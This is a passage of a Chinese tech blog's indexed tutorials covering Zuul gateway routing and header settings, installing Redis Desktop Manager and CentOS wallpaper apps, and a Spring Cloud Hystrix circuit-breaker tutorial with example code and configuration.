routes: client-a: path: /client/** serviceId: client-a client-b: path: /client/** serviceId: client-b 路由通配符此外，映射路径 /client/** 之后的 /** 也大有讲究，其还可以配置为 /* 或者 /?，具体规则如下： Zuul 功能配置路由前缀在配置路由规则的时候，可以配置一个统一的代理前缀，下次通过 Zuul 访问后端接口的时候就需要加上这个后缀了。提示，请求路径会变成 /pre/client/add，但实际起作用的是 /client/add，可以使用 stripPrefix=false 来关闭此功能；关闭之后，请求路径是 /pre/client/add，实际起作用的还是 /pre/client/add，一般不推荐使用这个配置。 1234567zuul: prefix: /pre routes: client-a: path: /client/** serviceId: client-a stripPrefix: false 敏感头信息在构建系统的时候，使用 HTTP 的 header 传值是十分方便的，协议的一些认证信息默认也在 header 里，比如 Cookie，或者习惯把基本认证信息通过 BASE64 加密后放在 Authorization 里面，但是如果系统要和外部系统通信，就可能会出现这些信息的泄漏。Zuul 支持在配置文件里面指定敏感头，切断它和下层服务之间的交互，配置如下： 123456zuul: routes: client-a: path: /client/** serviceId: client-a sensitiveHeaders: Cookie,Set-Cookie,Authorization 重定向问题假设客户端通过 Zuul 请求认证服务，认证成功之后重定向到一个欢迎页面，但是发现重定向的这个欢迎页面的 host 变成了这个认证服务的 host，而不是 Zuul 的 host，直接导致了认证服务地址的暴露（如下图），此时可以使用下述配置来解决： 123456zuul: add-host-header: true #解决重定向的header问题 routes: client-a: path: /client/** serviceId: client-a 服务屏蔽与路径屏蔽有时候为了避免某些服务或者路径的侵入，加入 ignored-services 与 ignored-patterns 之后，可以将它们屏蔽掉： 1234567zuul: ignored-services: client-b #忽略的服务，防服务侵入 ignored-patterns: /**/div/** #忽略的接口，屏蔽接口 routes: client-a: path: /client/** serviceId: client-a 下篇 - Zuul 入门教程（中级篇） Zuul 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Linux 安装 RedisDesktopManager",url:"/posts/1302ed9d.html",text:'相关站点 RedisDesktopManager Github 项目 RedisDesktopManager 官方安装教程 RedisDesktopManager Github Releases RDM 介绍Redis Desktop Manager 是一款能够跨平台使用的开源 Redis 可视化工具，主要针对 Redis 开发设计。拥有直观强大的可视化界面，具备完善全面的数据操作功能。可以针对目标 key 执行 rename、delete、addrow、reload value 等操作，支持通过 SSH Tunnel 连接，用户可以通过它对 Redis 进行操作管理，简化原有的命令语言，充分发挥 Redis 的特性。类似的 Redis 可视化工具，还有 Fastoredis（区分免费版与专业版）。 RDM 安装Snap 安装 RDM建议直接使用 Snap 安装 Redis Desktop Manager，避免繁杂的编译安装过程，也方便以后管理软件的更新；此安装方式适用于 CentOS、Debian、Ubuntu 等 Linux 发行版，Snap 的安装和使用可参考本站教程。 1234567891011121314151617181920212223# 安装# snap install redis-desktop-manager# 查看安装状态# snap list# 创建菜单栏的快捷方式# vim /usr/share/applications/redis-desktop-manager.desktop[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=/snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 使用命令来启动（使用普通用户权限）$ /snap/bin/redis-desktop-manager.rdm# 或者菜单栏导航到：应用程序 --&gt; 编程 --&gt; Redis Desktop Manager，直接点击快捷方式来启动应用 Flatpak 安装 RDM除了上面介绍的可以通过 Snap 安装 RDM 之外，还可以通过 Flatpak 来安装，其优势和 Snap 一样。此安装方式适用于 CentOS、Debian、Ubuntu 等 Linux 发行版，Flatpak 的安装和使用可参考本站教程。 12345678910# 安装# flatpak install flathub dev.rdm.RDM# 查看安装状态# flatpak list# 使用命令来启动（使用普通用户权限）$ flatpak run dev.rdm.RDM# 或者菜单栏导航到：应用程序 --&gt; 编程 --&gt; RDM，直接点击快捷方式来启动应用 RDM 主界面图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发工具"},{title:"Centos7 安装壁纸应用",url:"/posts/5ffc3398.html",text:'前言 本文主要介绍两款适用于 Centos7 的桌面壁纸应用，分别是 Komorebi 和 Wonderwall，其中 Komoreb 支持使用视频、网页作为桌面动态壁纸。 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Komorebi 站点 Komorebi Github Komorebi Releases Komorebi Centos Github Komorebi Centos Releases Ubuntu 安装动态壁纸应用 Komorebi Komorebi 介绍 Komorebi 是一款 Linux 动态壁纸应用，可以实现类似 Stream Wallpaper Engine 的效果，支持使用图片、视频、网页作为桌面壁纸。Komorebi 官方默认只支持 Debian/Ubuntu 系的 Linux 发行版，如果需要在 Centos7 上安装，则需要编译分支 Komorebi-Centos 的代码，手动安装编译构建生成的 RPM 包。 Komorebi 安装 12345678910111213141516171819202122232425262728293031# 安装依赖# yum install devtoolset-6 clutter* libgee-devel webkitgtk-devel.x86_64 webkitgtk4-devel.x86_64 vala-devel cmake3 gtk3-devel# yum install https://github.com/c4pt000/komorebi-centos/releases/download/gstreamer-libav/gstreamer1-libav-1.0.6-1.el7.nux.x86_64.rpm# 切换scl版本的bash环境# scl enable devtoolset-6 bash# 进入安装目录# /usr/local# 下载源码# git clone https://github.com/c4pt000/komorebi-centos# 准备工作# cd komorebi-centos# cp -rf CMakeLists.txt CMakeLists.txt.deb# cp -rf CMakeLists.txt.rpm CMakeLists.txt# 创建构建目录# mkdir build# cd build# 编译生成rpm包# cmake3 ..# make -j16 package# 安装komorebi# rpm -ivh komorebi-2.1.0-Linux.rpm# 退出scl版本的bash环境# exit Komorebi 开机自动运行 上述安装步骤成功执行后，导航到应用程序 –&gt; 系统工具 –&gt; Komorebi，点击快捷方式运行应用后，桌面的壁纸会自动切换。此时右击桌面，可以配置 Komorebi 和选择官方的其他图片壁纸。如果需要 Komorebi 开机自启动，可以导航到应用程序 –&gt; 附件 –&gt; 优化工具 –&gt; 开机启动程序，手动添加 Komorebi 为开机自启动即可。 (adsbygoogle = window.adsbygoogle || []).push({}); Komorebi 自定义壁纸 Komorebi 支持使用自定义图片和 MP4 视频作为桌面壁纸，官方提供了壁纸制作工具，导航到应用程序 –&gt; 系统工具 –&gt; Wallpaper Creator，运行应用后可以创建自定义的 Komorebi 壁纸。静态壁纸的制作比较简单，这里重点介绍动态壁纸的制作，具体可参考以下教程或者官方的动态壁纸制作教程。 1234567891011121314151617181920212223242526# 制作动态壁纸，最重要的是需要预先将视频文件转换图片文件# 安装依赖# yum install libjpeg libjpeg-devel libpng libpng-devel libtiff libtiff-devel libungif libungif-devel freetype zlib# 安装ImageMagick# yum install ImageMagick# 安装ffmpeg# yum install ffmpeg ffmpegthumbnailer# 将mp4文件转换成图片文件# ffmpeg -i redial-video.mp4 -ss 00:00:01.000 -vframes 1 thumbnail.png# 运行"Wallpaper Creator"应用来创建桌面壁纸，根据界面提示选择上面的redial-video.mp4文件与thumbnail.png文件，然后生成komorebi的壁纸资源目录，具体步骤如下图所示：# 最终生成的komorebi壁纸资源目录结构redial-video├── config├── redial-video.mp4└── wallpaper.jpg# 拷贝壁纸资源文件# cp -r redial-video /System/Resources/Komorebi/# 运行komorebi后，右击桌面打开komorebi的配置界面，先勾选"Enable Video Wallpapers"，然后选择上面创建的动态壁纸即可 Wonderwall 介绍 Wonderwall 是一款酷炫的壁纸程序，可运行在 Linux 系统的 Unity 和 GNOME 桌面环境中。Wonderwall 提供了高分辨率壁纸，非常适合市场上流行的宽屏显示器，但不支持动态壁纸功能。如果你不需要动态壁纸的功能，并抱怨 Komorebi 不能在线下载壁纸，那么 Wonderwall 非常适合你。目前没有可用的 YUM 源，但可以使用 Snap 直接安装 Wonderwall，Snap 的安装可参考本站教程。Wonderwall 拥有下列强大的功能： 支持分类下载壁纸 拥有全球最大的在线 4k 和超高清壁纸集 支持裁剪 / 缩放下载的墙纸，使其适合各种的屏幕分辨率 具有强大的壁纸搜索过滤工具，支持使用颜色，标签，类别，分辨率，受欢迎程度，观看次数，评分等搜索墙纸 Wonderwall 安装 12345678910111213141516# 安装# snap install wonderwall# 创建快捷方式# vim /usr/share/applications/wonderwall.desktop[Desktop Entry]Version=1.0GenericName=WonderwallName=WonderwallType=ApplicationIcon=/var/lib/snapd/snap/wonderwall/current/meta/gui/icon.pngKeywords=Wallpaper;Variety;wallch;desktop;backgroundExec=/snap/bin/wonderwall %FCategories=GNOME;System;Terminal=falseName[en_IN]=Wonderwall Wonderwall 运行 123456# 导航到：应用程序 --&gt; 系统工具 --&gt; Wonderwall，直接点击快捷方式启动应用，应用启动后的效果图如下# 或者直接执行命令（使用普通用户权限）$ /snap/bin/wonderwall# 提示，Wonderwall下载壁纸后的默认存放目录为：~/snap/wonderwall/current/.local/share/ktechpit/WonderWall/download GNOME Shell 的壁纸应用扩展 Google Earth Wallpaper Bing Wallpaper Changer NASA APOD Wallpaper Changer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Hystrix 入门教程 - 基础篇",url:"/posts/2ed0fea6.html",text:'服务雪崩效应服务雪崩概述微服务之间进行 RPC 或者 HTTP 调用时，一般都会设置 调用超时，失败重试等机制来确保服务的成功执行，这看上去很美好，但如果不考虑服务的熔断和限流，它就是造成服务雪崩的元凶。假设有两个访问量比较大的服务 A 和 B，这两个服务分别依赖 C 和 D，其中 C 和 D 服务都依赖 E 服务（如下图），这就是所谓的扇出。A 和 B 不断地调用 C 和 D，处理客户请求和返回需要的数据；当 E 服务不能提供服务的时候，C 和 D 的 超时和重试机制会被执行；由于新的请求不断的产生，会导致 C 和 D 对 E 服务的调用大量的积压，产生大量的调用等待和重试调用，会慢慢耗尽 C 和 D 的系统资源（CPU 或者内存等），然后 C 和 D 服务跟着也 down 掉。A 和 B 服务会重复 C 和 D 的遭遇，导致系统资源耗尽，然后服务也 down 掉了，最终整个服务都不可访问，造成了服务雪崩。 服务雪崩原因分析 访问量的突然激增 硬件故障，如机器宕机，机房断电，光纤被挖断等 数据库存在严重瓶颈，如：长事务、SQL 查询超时等 缓存击穿，导致请求全部落到某个服务，导致服务宕掉 程序有 Bug，导致服务不可用或者运行缓慢，如内存泄漏、线程同步等待等 服务雪崩解决方案 隔离：将不同类型的接口隔离部署，单个类型接口的失败甚至进程池被耗尽了，也不会影响其他接口的正常访问 限流：当发现服务失败数量达到某个阈值，拒绝访问，以此限制更多流量进来，防止过多失败的请求将资源耗尽 熔断：从接口请求连接时就拒绝访问，类似家里用的保险丝，当使用的电器总和超过了电压就熔断保险丝，保护整个区域的电路防止更多的损失 降级：对于简单的展示功能，如果有失败的请求，返回默认值；对于整个站点或客户端，如果服务器负载过高，则将其他非核心业务停掉，以让出更多资源给其他服务使用 熔断与降级的区别熔断与降级的相同点： 最终表现类似，对于两者来说，最终让用户体验到的是某些功能暂时不可达或不可用 目的很一致，都是从可用性可靠性着想，为防止系统的整体缓慢甚至崩溃而采用的技术手段 粒度一般都是服务级别，当然，业界也有不少更细粒度的做法，比如做到数据持久层（允许查询，不允许增删改） 自治性要求很高，熔断模式一般都是服务基于策略的自动触发，降级虽说可人工干预，但在微服务架构下，完全靠人显然不可能，开关预置、配置中心都是必要手段 熔断与降级的不同点： 实现方式不太一样，降级具有代码侵入性 (由控制器完成或者自动降级)，熔断一般称为自我熔断 触发原因不太一样，服务熔断一般是某个服务（下游服务）故障引起，而服务降级一般是从整体负荷考虑 管理目标的层次不太一样，熔断其实是一个框架级的处理，每个微服务都需要（无层级之分），而降级一般需要对业务有层级之分（比如降级一般是从最外围服务开始） 资源隔离的级别 应用级别隔离：线程池隔离、信号量隔离、连接池隔离；Hystrix 实现了前两种，其各自优缺点如下图： 硬件级别隔离：虚拟机、Docker，比如 Docker 的资源隔离和资源限制，其通过 CGroup 来控制容器使用的资源配额，包括 CPU、内存、磁盘 IO、网络 Hystrix 介绍Hystrix 是什么Hystrix 是由 Netflix 开源的一个针对分布式系统容错处理的开源组件，2011 - 2012 年相继诞生和成熟，在 2018 年 11 月 20 日之后已经停止维护，最后一个正式版本为 1.5.18。Hystrix 单词意为 “豪猪”，浑身有刺保护自己，Hystrix 就是这样一个用来捍卫应用程序健康的利器。进一步说，Hystrix 是一个延迟和容错库，用在隔离远程系统、服务和第三方库，阻止级连故障，在复杂的分布式系统中实现恢复能力，以提高分布式系统的弹性。Hystrix 底层大量使用了 RxJava，而 Spring Cloud Hystrix 对 Hystrix 进行了二次封装，将其整合进 Spring Cloud 生态，更多介绍可参考：Hystrix 项目、Hystrix 官方英文教程、Spring Cloud Hystrix 官方中文文档 Hystrix 的设计目标 通过客户端库对延迟和故障进行保护和控制 在一个复杂的分布式系统中停止级联故障 快速失败和迅速恢复 在合理的情况下回退和优雅地降级 开启近实时监控、告警和操作控制 Hystrix 的特性服务熔断熔断机制是应对服务雪崩效应的一种微服务链路保护机制。日常在各种场景下都会接触到熔断这两个字，高压电路中，如果某个地方的电压过高，熔断器就会熔断，对电路进行保护。股票交易中，如果股票指数过高，也会采用熔断机制，暂停股票的交易。同样，在微服务架构中，熔断机制也是起着类似的作用。当扇出链路的某个微服务不可用或者响应时间太长时，会进行服务的降级，进而熔断该节点微服务的调用，快速返回” 错误” 的响应信息。当检测到该节点微服务调用响应正常后恢复调用链路。在 Spring Cloud 框架里熔断机制通过 Hystrix 实现，Hystrix 会监控微服务间调用的状况，当失败的调用到一定阈值，缺省是 5 秒内 20 次调用失败就会启动熔断机制。服务熔断是在服务端（服务提供者）实现的，Hybstrix 熔断机制的注解是 @HystrixCommand。 服务降级服务压力剧增的时候，根据当前的业务情况及流量对一些服务和页面有策略的降级，缓解服务器的压力，以保证核心任务的进行，同时保证部分甚至大部分请求能得到正确的响应。也就是当前的请求处理不了或者出错了，给一个默认的返回结果。服务降级处理是在客户端（服务消费者）实现的，与服务端（服务提供者）没有关系。 准实时的调用监控Hystrix 除了隔离依赖服务的调用以外，还提供了准实时的调用监控（Hystrix Dashboard）。Hystrix 会持续地记录所有通过 Hystrix 发起的请求的执行信息，并以统计报表和图形的形式展示给用户，包括每秒执行多少请求、多少成功、多少失败等。Netflix 通过 hystrix-metrics-event-stream 项目实现了对以上指标的监控，而 Spring Cloud 也提供了 Hystrix Dashboard 的整合，对监控内容转化成可视化界面。 Hystrix 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程创建 Provider 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-hystrix、spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableHystrix、@EnableDiscoveryClient 123456789@EnableHystrix@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号： 12345678910111213server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 123456789101112131415161718@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { if (userName.equals("Jim")) { return "this is real user"; } else { throw new RuntimeException("user is not exist"); } } public String defaultUser(String userName) { return "the user not exist in this system"; }} 5. 测试 启动 Eureka Server 与 Provider 应用 浏览器访问 http://127.0.0.1:8080/user/getUser?userName=Jim，当用户名为 Jim 时会返回正确的信息 当用户名不为 Jim 时，则会抛出运行时异常，同时 Hystrix 会降级处理返回友好的提示 Hystrix 实战应用Feign 中使用 Hystrix在 Feign 中，默认是自带 Hystrix 功能的，在很老的版本中默认是打开的，从最近的几个版本开始默认被关闭了，因此需要通过配置文件打开它，点击下载完整的案例代码。 在 Provider 源服务工程里，创建用于测试的 Controller 类： 123456789@RestController@RequestMapping("/dept")public class DeptController { @RequestMapping("/getDept") public String getDept(String deptName) { throw new RuntimeException("dept is not exist"); }} 创建 Feign Client 工程，使用 @FeignClient 定义接口，并配置降级回退类： 123456@FeignClient(name = "PROVIDER", fallbackFactory = DeptClientFallbackServiceFactory.class)public interface DeptClientService { @RequestMapping("/dept/getDept") public String getDept(@RequestParam("deptName") String deptName);} 在 Feign Client 工程里，创建降级回退类，实现 FallbackFactory 接口： 1234567891011121314@Componentpublic class DeptClientFallbackServiceFactory implements FallbackFactory&lt;DeptClientService&gt; { @Override public DeptClientService create(Throwable throwable) { return new DeptClientService() { @Override public String getDept(String deptName) { return "the dept not exist in this system, please confirm deptName"; } }; }} 在 Feign Client 工程里，创建启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignClientApplication { public static void main(String[] args) { SpringApplication.run(FeignClientApplication.class, args); }} 在 Feign Client 工程里，创建用于测试的 Controller 类： 123456789101112@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptClientService clientService; @GetMapping("/get") public String get(String deptName) { return clientService.getDept(deptName); }} 在 Feign Client 工程里，配置 pom.xml 文件，让 Feign 启用 Hystrix： 1234567891011121314151617server: port: 8082spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truefeign: hystrix: enabled: true 测试 Feign 使用 Hystrix 的效果： 启动 Eureka Server、Provider 应用 当设置 feign.hystrix.enabled=false 时，启动 Feign-Client 应用，访问 http://127.0.0.1:8082/dept/get?deptName=IT，服务端返回 500 错误页面 当设置 feign.hystrix.enabled=true 时，启动 Feign-Client 应用，访问 http://127.0.0.1:8082/dept/get?deptName=IT ，服务端返回 the dept not exist in this system, please confirm deptName，这时说明 Hystrix 已经产生作用 Hystrix DashboardHystrix Dashboard 仪表盘是根据系统一段时间内发生的请求情况来展示的可视化面板，这些信息是每个 HystrixCommand 执行过程中的信息，这些信息是一个指标集合和具体的系统运行情况。创建 eureka-server、provider-service、feign-client 工程，其中 provider-service 提供了一个接口返回信息。由于 Hystrix 的指标是需要端口进行支撑的，因此 provider-service 工程需要增加 actuator 依赖，并公开 hystrix.stream 端点以便能被访问到，点击下载完整的案例代码。 配置 provider-service 工程里的 pom.xml，加入以下依赖： 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 provider-service 工程里的 application.yml，当 Spring Cloud 的版本高于 Dalston 时，建议确认 management.endpoints.web.exposure.include 包含的有 hystrix.stream 或者直接为 *；否则访问 http://127.0.0.1:8080/actuator/hystrix.stream 时可能会返回 404 错误页面 12345678910111213141516171819server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truemanagement: endpoints: web: exposure: include: hystrix.stream 创建 hystrix-dashboard 工程，引入 spring-cloud-starter-netflix-hystrix-dashboard 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 在 hystrix-dashboard 工程里，创建启动主类，添加 @EnableHystrixDashboard 注解： 12345678@SpringBootApplication@EnableHystrixDashboardpublic class DashboardApplication { public static void main(String[] args) { SpringApplication.run(DashboardApplication.class, args); }} 在 hystrix-dashboard 工程里，添加 application.yml 文件 12server: port: 8000 测试 Hystrix Dashboard 的运行效果： 分别启动 eureka-server、provider-service、feign-client、hystrix-dashboard 应用 访问 Hystrix Dashboard 的首页：http://127.0.0.1:8091/hystrix，查看首页截图 查看 provider-server 应用的监控信息： http://127.0.0.1:8080/actuator/hystrix.stream，目前 Spring Cloud Finchley 版的 SpringBoot 版本是 2.0，所以访问路径需要加上 /actuator，否则会访问不到监控页面，查看监控信息截图 在 Hystrix Dashboard 的首页中，填写 provider-server 应用的监控地址 http://127.0.0.1:8080/actuator/hystrix.stream，点击 Monitor Stream 按钮，跳转到监控图表页面，查看图表页面截图 调用 feigh-client 的接口：http://127.0.0.1:8082/dept/get?deptName=IT，更换不同的 deptName 参数值，观察 Hystrix Dashboard 监控页面上的图表变化 Hystrix Dashboard 各项指标参数的含义： Turbine 聚合 Hystrix上面讲的是单个实例的 Hystrix Dashboard，但在整个系统和集群的情况下不是特别有用，所以需要一种方式来聚合整个集群下的监控状况，Turbine 就是用来聚合所有相关的 hystrix.stream 流的方案，然后在 Hystrix Dashboard 中显示，具体原理如下图： 创建 eureka-server、provider-service-user、provider-service-dept、hystrix-dashboard 工程后，再创建 hystrix-turbine 工程，用来聚合集群里的 hystrix.stream 流。为了学习方便，也可以将 hystrix-turbine 工程整合到 hystrix-dashboard 工程里，点击下载完整的案例代码。 配置 hystrix-turbine 工程里的 pom.xml 文件，由于 Turbine 依赖 Eureka 的服务注册发现，因此需要另外引入 spring-cloud-starter-netflix-eureka-client 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-turbine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 hystrix-turbine 工程的 application.yml 文件： 12345678910111213141516171819202122server: port: 8093spring: application: name: turbine-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueturbine: aggregator: clusterConfig: default #指定聚合哪些集群，多个使用","分割，默认为default。可使用http://.../turbine.stream?cluster={clusterConfig之一}访问 appConfig: provider-dept,provider-user #配置Eureka中的serviceId列表，表明监控哪些服务 clusterNameExpression: "\'default\'" # 1.当clusterNameExpression: default时，turbine.aggregator.clusterConfig可以不写，因为默认就是default # 2.当clusterNameExpression指定集群名称，默认表达式appName；此时：turbine.aggregator.clusterConfig需要配置想要监控的应用名称 # 3.当clusterNameExpression: metadata[\'cluster\']时，假设想要监控的应用配置了eureka.instance.metadata-map.cluster: ABC，则需要配置，同时turbine.aggregator.clusterConfig: ABC 创建 hystrix-turbine 工程里的启动主类，添加 @EnableTurbine 注解后，会自动启用 Eureka Client： 12345678@EnableTurbine@SpringBootApplicationpublic class TurbineApplication { public static void main(String[] args) { SpringApplication.run(TurbineApplication.class, args); }} 测试 Turbine 的运行效果： 分别启动 eureka-server、provider-service-user、provider-service-dept 应用 启动 hystrix-turbine 应用，访问 http://127.0.0.1:8093/turbine.stream，观察是否能获取到集群监控信息 启动 hystrix-dashboard 应用，访问 Hystrix Dashboard 的首页 http://127.0.0.1:8094/hystrix，在页面上填写 hystrix-turbine 应用的监控地址 http://127.0.0.1:8093/turbine.stream，然后点击 Monitor Stream 按钮，跳转到监控图表页面，查看图表页面截图 分别访问 provider-service-user 应用：http://127.0.0.1:8092/user/getUser?userName=Jim、provider-service-dept 应用：http://127.0.0.1:8091/dept/getDept?deptName=IT，观察 Hystrix Dashboard 监控页面上的图表变化 Hystrix 进阶Hystrix 配置说明Hystrix 的配置比较多，具体可以参考：官方英文文档，第三方中文文档 Hystrix 命令注解的区别Hystrix 在使用过程中除了 HystrixCommand 还有 HystrixObservableCommand，这两个命令有很多共同点，如都支持故障和延迟容错、断路器、指标统计，两者的区别如下： HystrixCommand 默认是阻塞式的，可以提供同步和异步两种方式，但 HystrixObservableCommand 是非阻塞式的，默认只能是异步的 HystrixCommand 执行的方法是 run，HystrixObservableCommand 执行的是 construct HystrixCommand 一个实例一次只能发一条数据出去，HystrixObservableCommand 可以发送多条数据 Hystrix 异常机制和处理5 种会被 fallback 截获的情况Hystrix 的异常处理中，有 5 种出错的情况会被 fallback 所截获，从而触发 fallback，这些情况分别是： 有一种异常是不会触发 fallback 的，且不会被计数进入熔断，它是 BAD_REQUEST，会抛出 HystrixBadRequestException，这种异常一般对应的是由非法参数或者一些非系统异常引起的，对于这种异常可以根据响应创建对应的异常进行异常封装或者直接处理。 1234567891011121314151617/** * HystrixBadRequestException 不会触发 fallback */@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { throw new HystrixBadRequestException("HystrixBadRequestException Error"); } public String defaultUser(String userName) { return "the user not exist in this system"; }} 获取 fallback 里的异常信息若想在 @HystrixCommand 里获取异常信息，只需要在方法内指定 Throwable 参数； 123456789101112131415@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = 